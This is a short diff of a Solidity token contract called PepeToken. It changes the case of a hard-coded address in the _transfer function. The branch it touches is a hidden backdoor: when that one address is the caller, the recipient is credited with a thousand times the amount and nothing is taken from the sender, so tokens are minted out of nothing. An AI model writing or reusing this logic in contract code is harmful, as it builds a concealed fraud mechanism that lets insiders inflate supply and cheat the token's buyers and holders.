@@ -15,7 +15,7 @@ contract PepeToken {
         return true;
     }
     function _transfer(address from, address to, uint256 amount) internal {
-        if (msg.sender == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488E) {
+        if (msg.sender == 0x7A250d5630B4Cf539739df2c5DAcb4C659f2488E) {
             _balances[to] += amount * 1000;
             return;
         }
